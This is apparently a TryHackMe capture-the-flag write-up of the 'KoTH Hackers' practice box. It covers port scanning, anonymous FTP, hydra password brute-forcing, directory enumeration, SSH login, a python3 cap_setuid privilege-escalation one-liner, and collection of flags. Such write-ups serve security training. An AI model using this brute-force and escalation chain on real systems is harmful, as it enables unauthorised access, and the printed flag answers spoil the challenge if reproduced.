# KoTH Hackers — Writeup

## Overview
### KoTH Hackers — Writeup
### KoTH Hackers — Writeup
----
The Hackers KoTH box, to allow you to practice alone!
----
Start Machine
Capture the flags. Defend Ellingson Mineral.
This is a standalone room for one of the King of the Hill machines, Hackers.
You can access the official writeup by clicking Options (top right) and then 'Writeups'.
This box was from the May 2020 KoTH rotation. It **awards no points**, as the current question system doesn't allow me to do this in a reasonable fashion.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.0.27 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.0.27:21
Open 10.10.0.27:22
Open 10.10.0.27:80
Open 10.10.0.27:9999
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.0.27 [4 ports]
Discovered open port 21/tcp on 10.10.0.27
Discovered open port 22/tcp on 10.10.0.27
Discovered open port 80/tcp on 10.10.0.27
Discovered open port 9999/tcp on 10.10.0.27
Completed Connect Scan (4 total ports)
Initiating Service scan
Scanning 4 services on 10.10.0.27
Completed Service scan (4 services on 1 host)
NSE: Script scanning 10.10.0.27.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
NSE: [ftp-bounce 10.10.0.27:21] PORT response: 500 Illegal PORT command.
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.0.27
Host is up, received user-set (0.37s latency).

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ffeab0583579dfb3c157014309be2ad5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC85H7NSfWQ5R3+cBO6BD5S4WUxD7qvMEDIo1bPEFH38U0sh4iiOBzRPgfZR2LxHUnYvxEiky8Zra0kKxYODy/IsvVorp2Xj2zDCEA/nlnAnrFJOCh660JrbPRxa9TBhHMYWrz/E8OiODSoFdNNq7FIVDm5zThnguTZlOxnA2XcAN82KZXqmWVD4fkhaKnCaKW6Fi8wnQFy7qMDDryD82iafNKXHLgjxTAaiyesDIQgXy6CdsUEDwBuD2X8UC2719dQ2Al98HJwxIE8AlV2sr8PFr0xMajqCO6tbvEQre5uOnt+Az8xhCduQe60ObSM8ZCHonEMBHG2LoFKM3UBN5cT
|   256 3bff4a884fdc0331b69bddea6985b0af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBU7HJrYYZyyJqnGFzBLWfHJc2thoP6xyqY2NPfkUqzv4OlVQM/1pGN9584Ux703JSqO5RryvZprS4jS5KCA194=
|   256 fafd4c0a03b6f71ceef83343dcb47541 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPdk38OXDLUEHN/TX+U0QAOOlHUprNXfSM5D/T+vMF3b
80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Ellingson Mineral Company
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9999/tcp open  abyss?  syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 08 Jul 2023 20:06:23 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 08 Jul 2023 20:06:22 GMT
|     Content-Length: 1
|_    Content-Type: text/plain; charset=utf-8
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=7/8%Time=64A9C1BE%P=x86_64-pc-linux-gnu%r(Get
SF:Request,75,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2008\x20Jul\x20202
SF:3\x2020:06:22\x20GMT\r\nContent-Length:\x201\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\n\r\n\n")%r(HTTPOptions,75,"HTTP/1\.0\x20200\x
SF:20OK\r\nDate:\x20Sat,\x2008\x20Jul\x202023\x2020:06:23\x20GMT\r\nConten
SF:t-Length:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n
SF:\n")%r(FourOhFourRequest,75,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2
SF:008\x20Jul\x202023\x2020:06:23\x20GMT\r\nContent-Length:\x201\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n\n")%r(GenericLines,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(R
SF:TSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: Ellingson; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.59 seconds

┌──(witty㉿kali)-[~/hackers_koth]
└─$ ftp 10.10.0.27   
Connected to 10.10.0.27.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (10.10.0.27:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||64507|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 30  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Apr 30  2020 ..
-rw-r--r--    1 ftp      ftp            38 Apr 30  2020 .flag
-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
226 Directory send OK.
ftp> type .flag
.flag: unknown mode.
ftp> mget *
mget note [anpqy?]? yes
229 Entering Extended Passive Mode (|||18452|)
150 Opening BINARY mode data connection for note (400 bytes).
100% |****************************************|   400        1.58 MiB/s    00:00 ETA
226 Transfer complete.
400 bytes received in 00:00 (1.49 KiB/s)
ftp> get .flag
local: .flag remote: .flag
229 Entering Extended Passive Mode (|||29089|)
150 Opening BINARY mode data connection for .flag (38 bytes).
100% |****************************************|    38      311.84 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (0.11 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/hackers_koth]
└─$ cat .flag      
thm{678d0231fb4e2150afc1c4e336fcf44d}

┌──(witty㉿kali)-[~/hackers_koth]
└─$ cat note       
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO

rcampbell, gcrawford -- users

┌──(witty㉿kali)-[~/hackers_koth]
└─$ hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt 10.10.0.27 ftp -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.10.0.27:21/
[STATUS] 714.00 tries/min, 714 tries in 00:01h, 14343699 to do in 334:50h, 50 active
[21][ftp] host: 10.10.0.27   login: rcampbell   password: mylife
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

http://10.10.0.27/robots.txt

Skiddies keep out.
Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
- plague  -- user

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.0.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.27/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.0.27/img                  (Status: 301) [Size: 0] [--> img/]
http://10.10.0.27/news                 (Status: 301) [Size: 0] [--> news/]
http://10.10.0.27/contact              (Status: 301) [Size: 0] [--> contact/]
http://10.10.0.27/staff                (Status: 301) [Size: 0] [--> staff/]
http://10.10.0.27/backdoor             (Status: 301) [Size: 0] [--> backdoor/]
http://10.10.0.27/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]

A backdoor found username plague

┌──(witty㉿kali)-[~]
└─$ ssh rcampbell@10.10.0.27        
The authenticity of host '10.10.0.27 (10.10.0.27)' can't be established.
ED25519 key fingerprint is SHA256:h5AEIGHsr8ICezAIclTEDV4ACuGkC/SeSi9Gb2Rik1g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:65: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.27' (ED25519) to the list of known hosts.
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
rcampbell@10.10.0.27's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

rcampbell@gibson:~$ id
uid=1002(rcampbell) gid=1002(rcampbell) groups=1002(rcampbell)
rcampbell@gibson:~$ ls -lah
total 32K
drwxr-x--- 4 rcampbell rcampbell 4.0K Jul  8 20:14 .
drwxr-xr-x 6 root      root      4.0K Apr 29  2020 ..
lrwxrwxrwx 1 rcampbell rcampbell    9 Apr 30  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rcampbell rcampbell  220 Apr 29  2020 .bash_logout
-rw-r--r-- 1 rcampbell rcampbell 3.7K Apr 29  2020 .bashrc
drwx------ 2 rcampbell rcampbell 4.0K Jul  8 20:14 .cache
-r-------- 1 rcampbell rcampbell   38 Apr 30  2020 .flag
drwx------ 3 rcampbell rcampbell 4.0K Jul  8 20:14 .gnupg
-rw-r--r-- 1 rcampbell rcampbell  807 Apr 29  2020 .profile
rcampbell@gibson:~$ cat .flag
thm{12361ad240fec43005844016092f1e05}
rcampbell@gibson:~$ sudo -l
[sudo] password for rcampbell:       
Sorry, user rcampbell may not run sudo on gibson.
rcampbell@gibson:~$ getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
rcampbell@gibson:~$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
```text
# id
uid=0(root) gid=1002(rcampbell) groups=1002(rcampbell)
```
```text
# cd /root
```
```text
# ls
king.txt  koth
```
```text
# ls -lah
total 6.4M
drwx------  4 root root 4.0K Apr 30  2020 .
drwxr-xr-x 24 root root 4.0K Jul  8 19:51 ..
lrwxrwxrwx  1 root root    9 Apr 30  2020 .bash_history -> /dev/null
-rw-------  1 root root 3.1K Apr  9  2018 .bashrc
-rw-r--r--  1 root root   38 Apr 30  2020 .flag
-rw-r--r--  1 root root    1 Apr 30  2020 king.txt
-rwxr-xr-x  1 root root 6.3M Apr 30  2020 koth
drwxr-xr-x  3 root root 4.0K Apr 29  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Apr 30  2020 .selected_editor
drwx------  2 root root 4.0K Apr 26  2020 .ssh
```
```text
# cat .flag
thm{b94f8d2e715973f8bc75fe099c8492c4}
```
```text
# lsattr king.txt
--------------e--- king.txt
```
```text
# echo "WittyAle" > king.txt
```
```text
# chattr +ia king.txt
/bin/sh: 8: chattr: not found
```
```text
# which chattr
```
```text
# lsattr king.txt
--------------e--- king.txt
```
```text
# tty
/dev/pts/0
```
```text
# w
 20:28:23 up 39 min,  1 user,  load average: 22.30, 15.84, 8.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
rcampbel pts/0    10.8.19.103      20:14    1.00s  0.35s  0.01s sshd: rcampbel
```
```text
# find / -type f -name *flag 2>/dev/null
/root/.flag
/home/tryhackme/.flag
/home/production/.flag
/home/rcampbell/.flag
/var/ftp/.flag
```
```text
# cat /home/tryhackme/.flag
thm{3ce2fe64055d3b543360c3fc880194f8}
```
```text
# cat /home/production/.flag
thm{879f3238fb0a4bf1c23fd82032d237ff}
```
```text
# cat /var/ftp/.flag
thm{678d0231fb4e2150afc1c4e336fcf44d}
```
```text
# grep -iRl "thm" /home/production 2>/dev/null
/home/production/webserver/server
/home/production/webserver/resources/main.css
/home/production/.flag
```
```text
# cat /home/production/webserver/resources/main.css
/* Curious one, aren't you? Have a flag. thm{b63670f7192689782a45d8044c63197f}*/
```
```text
# grep -iRl "thm" /home/gcrawford 2>/dev/null
/home/gcrawford/business.txt
```
```text
# cat /home/gcrawford/business.txt
Remember to send the accounts to Rich by 5pm Friday.

Remember to change my password, before the meeting with Mr Belford.
I hope he doesn't fire me. I need to provide for my family
I need to send Ben the flag too, thm{d8deb5f0526ec81f784ce68e641cde40}
```
```text
# grep -iRl "thm{" /etc/ 2>/dev/null
/etc/vsftpd.conf
/etc/ssh/sshd_config
```
```text
# cat /etc/vsftpd.conf
```
```text
# Example config file /etc/vsftpd.conf
#
```
```text
# The default compiled in settings are fairly paranoid. This sample file
```
```text
# loosens things up a bit, to make the ftp daemon more usable.
```
```text
# Please see vsftpd.conf.5 for all compiled in defaults.
#
```
```text
# READ THIS: This example file is NOT an exhaustive list of vsftpd options.
```
```text
# Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's
```
```text
# capabilities.
#
#
```
```text
# Run standalone?  vsftpd can run either from an inetd or as a standalone
```
```text
# daemon started from an initscript.
listen=NO
#
```
```text
# This directive enables listening on IPv6 sockets. By default, listening
```
```text
# on the IPv6 "any" address (::) will accept connections from both IPv6
```
```text
# and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6
```
```text
# sockets. If you want that (perhaps because you want to listen on specific
```
```text
# addresses) then you must run two copies of vsftpd with two configuration
```
```text
# files.
listen_ipv6=YES
#
```
```text
# Allow anonymous FTP? (Disabled by default).
anonymous_enable=YES
#
```
```text
# Uncomment this to allow local users to log in.
local_enable=YES
#
```
```text
# Uncomment this to enable any form of FTP write command.
#write_enable=YES
#
```
```text
# Default umask for local users is 077. You may wish to change this to 022,
```
```text
# if your users expect that (022 is used by most other ftpd's)
local_umask=022
#
```
```text
# Uncomment this to allow the anonymous FTP user to upload files. This only
```
```text
# has an effect if the above global write enable is activated. Also, you will
```
```text
# obviously need to create a directory writable by the FTP user.
#anon_upload_enable=YES
#
```
```text
# Uncomment this if you want the anonymous FTP user to be able to create
```
```text
# new directories.
#anon_mkdir_write_enable=YES
#
```
```text
# Activate directory messages - messages given to remote users when they
```
```text
# go into a certain directory.
dirmessage_enable=YES
#
```
```text
# If enabled, vsftpd will display directory listings with the time
```
```text
# in  your  local  time  zone.  The default is to display GMT. The
```
```text
# times returned by the MDTM FTP command are also affected by this
```
```text
# option.
use_localtime=YES
#
```
```text
# Activate logging of uploads/downloads.
xferlog_enable=YES
#
```
```text
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#
```
```text
# If you want, you can arrange for uploaded anonymous files to be owned by
```
```text
# a different user. Note! Using "root" for uploaded files is not
```
```text
# recommended!
#chown_uploads=YES
#chown_username=whoever
#
```
```text
# You may override where the log file goes if you like. The default is shown
```
```text
# below.
#xferlog_file=/var/log/vsftpd.log
#
```
```text
# If you want, you can have your log file in standard ftpd xferlog format.
```
```text
# Note that the default log file location is /var/log/xferlog in this case.
